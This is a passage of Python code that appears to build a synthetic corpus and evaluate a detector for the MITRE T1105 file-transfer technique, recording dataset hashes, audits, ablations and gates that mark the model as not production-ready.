        "baseline_paired_rows": 0,
        "dataset_file_sha256": hashes["serialized_dataset_sha256"],
        "full_dataset_content_sha256": hashes["full_dataset_content_sha256"],
        "fit_selection_content_sha256": hashes["fit_selection_content_sha256"],
        "split_manifest_sha256": dataset_manifest["split_manifest_sha256"],
        "manifest_reproducibility": "DETERMINISTIC_CONTROLLED_SYNTHETIC_CORPUS",
        "training_authorized_by_readiness_gates": False,
        "http_log_used": False,
        "t1105_semantics": "SESSION_BOUND_TRANSFER_ACTIVITY",
        "benign_content_transfer_label": "T1105_POSITIVE",
    })
    _write_json(candidate_path, candidate)
    _write_json(dataset_path, dataset)


def run(output_directory: Path, repetitions: int = 4) -> dict[str, Any]:
    output_directory.mkdir(parents=True, exist_ok=True)
    rows, manifest = build_corpus(repetitions=repetitions)
    collision = _collision_audit(rows)
    matched = _matched_benign_content_audit(rows)
    fit_selection_validation = manifest["fit_selection_validation"]
    modes = ("full", "command_presence", "without_sequence")
    candidates = {mode: fit_candidate(rows, mode) for mode in modes}
    # All candidates, preprocessors, and SELECTION thresholds have been frozen
    # and assigned canonical identities before SEALED_FINAL is evaluated.
    scored = _evaluate_frozen_candidates(rows, candidates)
    artifact = candidates["full"][0]
    t1105_hard_negative = scored["full"]["t1105_slices"]["no_transfer_session"]
    hard_negative_false_positives = int(t1105_hard_negative["fp"])
    t1105_controlled_gate = (
        "ALLOW_CONTROLLED_RESEARCH_ONLY"
        if collision["conflicting_vector_groups"] == 0
        and matched["pass"]
        and hard_negative_false_positives == 0
        else "BLOCK"
    )
    dataset_path = output_directory / "CONTROLLED_DATASET.v1.json"
    output_manifest_path = output_directory / "CONTROLLED_DATASET_MANIFEST.v1.json"
    artifact_path = output_directory / "MODEL2_UNIFIED_CONTROLLED_POC_ARTIFACT.v1.json"
    dataset_sha = _write_json(dataset_path, rows)
    manifest.update({
        "fit_selection_content_sha256": fit_selection_validation["dataset_content_sha256"],
        "full_dataset_content_sha256": _digest(rows),
        "serialized_dataset_sha256": dataset_sha,
        "t1105_nontransfer_hard_negative_rows": sum(
            not bool(row["labels"]["T1105"])
            and bool(set(row["control_tags"]).intersection(T1105_NONTRANSFER_HARD_NEGATIVE_TAGS))
            for row in rows
        ),
        "t1105_benign_content_transfer_positive_rows": sum(
            "benign_content_transfer_positive" in row["control_tags"] and bool(row["labels"]["T1105"])
            for row in rows
        ),
        "human_adjudication_performed": False,
        "production_ready": False,
    })
    _write_json(output_manifest_path, manifest)
    _write_json(artifact_path, artifact)
    hashes = {
        "serialized_dataset_sha256": hashlib.sha256(dataset_path.read_bytes()).hexdigest(),
        "dataset_manifest_file_sha256": hashlib.sha256(output_manifest_path.read_bytes()).hexdigest(),
        "serialized_artifact_sha256": hashlib.sha256(artifact_path.read_bytes()).hexdigest(),
        "full_dataset_content_sha256": _digest(rows),
        "fit_selection_content_sha256": fit_selection_validation["dataset_content_sha256"],
        "split_manifest_sha256": str(manifest["split_manifest_sha256"]),
        "feature_schema_sha256": FEATURE_SCHEMA_SHA256,
        "canonical_model_identity_sha256": str(artifact["artifact_sha256"]),
    }
    evaluation = {
        "warning": POC_WARNING,
        "dataset_manifest": manifest,
        "identity_hashes": hashes,
        "collision_audit": collision,
        "matched_benign_content_transfer_audit": matched,
        "t1105_hard_negative_gate": {
            "negative_support": t1105_hard_negative["negative_support"],
            "false_positives": hard_negative_false_positives,
            "pass": hard_negative_false_positives == 0,
            "controlled_gate": t1105_controlled_gate,
            "production_gate": "BLOCK",
        },
        "full_candidate": scored["full"],
        "ablations": {
            "command_presence_only": scored["command_presence"],
            "without_sequence": scored["without_sequence"],
        },
        "evaluation_protocol": {
            "weights_fit_only_on_fit": True,
            "preprocessing_fit_only_on_fit": True,
            "thresholds_selected_only_on_selection": True,
            "all_candidates_frozen_before_final_scoring": True,
            "final_set_scored_in_one_evaluation_run": True,
            "split_labels_are_in_same_synthetic_corpus_file": True,
            "externally_sealed_or_escrowed_final_labels": False,
            "human_adjudication_performed": False,
            "labels_generated_from_model_outputs": False,
            "model2_baseline_32f_changed": False,
            "http_response_features_used": False,
        },
        "claims": {
            "real_world_accuracy": "NOT_ESTIMATED",
            "production_readiness": False,
            "production_t1105_gate": "BLOCK",
            "t1105_controlled_gate": t1105_controlled_gate,
            "rrf_performance": "NOT_COMPUTED_WITHOUT_REAL_MODEL1_OUTPUTS",
            "model2_architecture": "UNIFIED_MULTI_OUTPUT",
            "single_t1105_model": False,
            "score_semantics": "SIGMOID_DECISION_SCORE_NOT_CALIBRATED_PROBABILITY",
        },
    }
    package_root = Path(__file__).resolve().parent
    if output_directory.resolve() == (package_root / "controlled_poc_output").resolve():
        _update_package_manifests(
            package_root,
            rows=rows,
            dataset_manifest=manifest,
            artifact=artifact,
            hashes=hashes,
            collision_audit=collision,
            matched_audit=matched,
            hard_negative_false_positives=hard_negative_false_positives,
        )
    _write_json(output_directory / "MODEL2_UNIFIED_CONTROLLED_POC_EVALUATION.v1.json", evaluation)
    return evaluation


def main(argv: Sequence[str] | None = None) -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--output-directory", type=Path, default=Path(__file__).resolve().parent / "controlled_poc_output")
    parser.add_argument("--repetitions", type=int, default=4)
    args = parser.parse_args(argv)
    result = run(args.output_directory, repetitions=args.repetitions)
    print(json.dumps(result, indent=2, ensure_ascii=False))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
